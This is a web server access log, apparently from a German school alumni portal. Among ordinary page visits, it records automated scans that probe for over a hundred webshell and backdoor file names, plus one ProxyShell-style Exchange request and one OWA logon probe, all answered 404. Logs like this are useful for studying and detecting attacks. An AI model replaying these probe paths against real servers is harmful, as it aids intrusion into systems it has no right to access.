b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:31;;/ca.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:32;;/lx.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:33;;/iuoqc.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:33;;/1j.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:34;;/qufsq.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:35;;/155.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:36;;/sosu.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:37;;/zero.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:37;;/667.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:38;;/c4.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:39;;/700.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:40;;/l.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:41;;/oddtd.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:41;;/v.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:42;;/ff.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:43;;/ca.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:44;;/inzrw.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:45;;/0x.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:45;;/sx.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:46;;/we.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:48;;/20025.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:48;;/asd67.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:49;;/axx.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:50;;/rtg.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:51;;/wp.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:52;;/wp-good.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:52;;/ngek.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:53;;/wp-admin/network/wp-conflg.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:54;;/3k4.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:55;;/file51.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:56;;/man.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:57;;/unrubbish.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:58;;/strubbly.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:59;;/tiqdc.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-05 04:21:59;;/hdwta.php;GET;404
b5caa88e35412f003842c602cea827c22a4c27260b7de510c217db732a66d9ba;2025-11-05 04:29:43;;/personen/alumni/schule/4240016;GET;200
bc4e12af47db0ebcede74ab147c185171752e8b335f4d47d3afcf20a58b8ce91;2025-11-05 04:33:57;;/postnews.php;GET;404
5877cd8959be301e27b0a56239ed18179e7968ecea6d9685dd5f2812b98be2d0;2025-11-05 04:40:31;;/personen/alumni/schule/5505;GET;200
332093e1226e33c7a31ecfd2a211e4a44a065e8eb2294bb9a1afc2eeccad2e77;2025-11-05 04:44:11;;/;GET;200
4cbf07e5c0d9b72b93084a38117185266e12548519bd52093284c99b6d389aef;2025-11-05 04:48:07;;/;GET;200
7f2f7488ec1d7f7280a11334f9a721c34f0658ad271edc78b9f6dcdce0c6b1f6;2025-11-05 04:48:30;;/aktuelles/stellenangebote;GET;200
ecccb17c0e139a6e7374103de0f111b676a5ea5edca0ba27b1371fdfd7e14dbd;2025-11-05 04:51:09;;/personen/alumni/schule/170720;GET;200
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:02;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:03;;/031.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:04;;/ilex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:04;;/flex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:05;;/222.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:05;;/444.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:06;;/file9.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:06;;/filesss.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:07;;/file88.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:07;;/gifclass4.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:08;;/555.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:09;;/333.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:09;;/hly.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:10;;/d12.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:10;;/2clas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:11;;/bless5.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:11;;/file15.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:12;;/hk.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:12;;/alpa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:13;;/file21.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:13;;/ssss.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:14;;/ut.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:15;;/inde.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:15;;/classgoto24.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:16;;/030.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:16;;/thh.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:17;;/indo.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:17;;/fileas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:18;;/yellow.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:18;;/33.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:19;;/plss3.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:19;;/he.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:20;;/thxt.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:20;;/wfile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:21;;/class20.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:21;;/1.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:22;;/usep.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:22;;/wa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:23;;/wb.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:23;;/file1.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:24;;/2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:25;;/a2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:25;;/a.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:26;;/gmo.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:26;;/info.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:27;;/file2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:27;;/lv.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:28;;/about.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:28;;/abcd.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:29;;/lock360.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:29;;/alfa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:30;;/NewFile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:30;;/atomlib.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:31;;/--.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:32;;/system_log.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:32;;/pp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:33;;/geck.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:33;;/gm.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:34;;/makeasmtp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:34;;/file4.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:35;;/lala.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:35;;/admin.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:36;;/7.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:36;;/file18.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:37;;/ffile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:37;;/file7.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:38;;/we.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:39;;/gfile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:39;;/jlex3.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:40;;/des.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:40;;/aaa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:41;;/gifclass.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:41;;/vee.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:42;;/efile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:42;;/afile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:43;;/errorfile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:43;;/f35.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:44;;/gool.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:45;;/haikh.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:45;;/135.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:46;;/enclas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:46;;/ioxi-o.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:47;;/wp-admin/js/wp-conflg.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:47;;/classwithtostring.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:48;;/image.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:48;;/wp-admin/wp-conflg.php?p=;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:49;;/mail.php?;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:49;;/sx.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:50;;/max.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:50;;/size.php?p=;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:51;;/mpxct.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:51;;/0xx.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:52;;/s.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:53;;/hq.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:53;;/blox.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:54;;/ant.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:54;;/fso.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:55;;/htaccess.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:55;;/wp-trackback.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:56;;/wp-admin/about.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:56;;/readme.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:57;;/v.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:57;;/sck.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:58;;/X7x.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:58;;/xpass.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:52:59;;/bless.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:00;;/bless2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:00;;/bless6.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:01;;/bless10.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:01;;/bless11.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:02;;/wp-admin/js/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:02;;/thoms.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:03;;/xsas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:03;;/xrp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:04;;/wp-freya.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:04;;/css/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:05;;/file30.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:05;;/fesa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:06;;/class-.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:07;;/.well-known/gecko-litespeed.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:07;;/up.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:08;;/403.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:08;;/9v6.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:09;;/lte7.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:09;;/1vbqo.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:10;;/l10n.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:10;;/tajj.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:11;;/fdd2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:11;;/class9.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:12;;/sto.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:12;;/7h.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:13;;/fh26.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:14;;/ixj.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:14;;/x23.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:15;;/zeu.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:15;;/f2r4.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:16;;/lopst.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:16;;/gecko.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:17;;/0xs.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:17;;/Zeiss.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:18;;/x0x.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-05 04:53:18;;/adin.php;GET;404
7dc56a91833f183b08820a2c0a269dff67bfae2f81bb124310dc0cd9644b0690;2025-11-05 04:59:09;;/;GET;200
d1a1f4ca9f41eb92df220694427798f2b76fe42dd54b365d2fd98a63fe77a4a8;2025-11-05 05:00:12;;/;GET;200
d0b11271174f528774cd123bb6b27bc67cbfaafe8433765619d4932211cf99a5;2025-11-05 05:01:15;;/personen/alumni/schule/HS002;GET;200
b93ade3af3f5556aa3340d50a0eb740fa3536894acb111d6cf63fb5ef14a47c2;2025-11-05 05:11:10;;/rechtliches/datenschutz;GET;200
60b4c44fd574393ffd43f1c73fd8bab222bc9e173e7c92cbb6000602bbf6fc72;2025-11-05 05:11:31;;/aktuelles/meldungen/details/alumni-portal-geht-am-1-april-online;GET;404
1b64654b82a7e332e74ed7735738a69668c5372f963d93597c2adc24bb352939;2025-11-05 05:12:52;/;/;GET;200
3e96aac6aadb9c1e45e1f58fed21eeeb6cc83976ebdd38e119c05cacb1a15c0e;2025-11-05 05:13:36;/gruppen/plausch/schulband-statt-fliessband;/gruppen/plausch/schulband-statt-fliessband;GET;200
1d69cb6c84b1a80a4212d0eb881ddc29a8ac901c3db7e6c130a6d79b205baa1f;2025-11-05 05:15:15;/;/;GET;200
65c1037585a2d62d365ccdcfd37047a888bffc737d5bf30fe2efdebae6edb863;2025-11-05 05:18:15;;/;GET;200
65c1037585a2d62d365ccdcfd37047a888bffc737d5bf30fe2efdebae6edb863;2025-11-05 05:18:16;;/favicon.png;GET;404
79fc733e8d0b1707e1fc2c56b1a8e7983cd3864745836e6d2c6c2c6e4724bfc7;2025-11-05 05:19:12;;/;GET;200
e59614aeee7e37f1335e4cd8c7312d190d295b1a93a94141ca5a6e98ee6c0b5c;2025-11-05 05:19:27;;/login;GET;200
0ae0527466c269dbf12c0fa7d7fab8609b996a72f753f99350816f919ab23702;2025-11-05 05:21:18;;/personen/alumni/schule/67210;GET;200
9ab4cfd83d2f6fd6df19d460808d834abd66bc22bee1e653382ac5e7192a5a5a;2025-11-05 05:24:02;;/sitemap.xml;GET;200
831d0dc9a2da542d12f5f992059934f64974c28b89072e72ecb0fbdc441f32b7;2025-11-05 05:24:47;/media/system/js/core.js;/media/system/js/core.js;GET;404
831d0dc9a2da542d12f5f992059934f64974c28b89072e72ecb0fbdc441f32b7;2025-11-05 05:24:48;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
2a81aedf65fbf03d75c2852ba2713f8d04caa6502c18c3eadf757eb933786304;2025-11-05 05:30:14;;/rechtliches/green-data;GET;200
d85e9c0fc5534e15ecaa816113d77c5564f62f23de32bd90d1c036c37418c3ec;2025-11-05 05:36:44;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
0419a51f78b35d19052a06cb2143b386f3f9caa333c880577cfa1e5e29331451;2025-11-05 05:38:32;;/rechtliches/impressum;GET;200
9b19746ea1edfdb1bb23cad4e5c0e3d358bc5cf56518844a5359aea5ada8d546;2025-11-05 05:44:40;;/owa/auth/logon.aspx;GET;404
d8db4c7bdd95a23874bafa98043fcbde39b5b1585701d10e61b761b07dd571ff;2025-11-05 05:51:35;;/.well-known/security.txt;GET;404
a3f7964d75549dc72a66a74fa0018647483eab378a9fa64985fbc88c68635ef3;2025-11-05 05:52:23;;/;GET;200
dc5ac8cc3842cc3fdb6bc94a292f019ed547d206cfe177340317398dbc390397;2025-11-05 05:52:53;;/personen/alumni/schule/5503;GET;200
4cbf07e5c0d9b72b93084a38117185266e12548519bd52093284c99b6d389aef;2025-11-05 05:53:01;;/;GET;200
d5c32c135d947e74c66aacd06f7d99cac53266add71fe3439b112bc9c4b86bbc;2025-11-05 06:03:14;;/personen/alumni/schule/59026;GET;200
f6e1f337fb967658677655b3683bbfaa9381ac62f152d3fd977528ebbcd8b7ee;2025-11-05 06:09:43;;/;GET;200
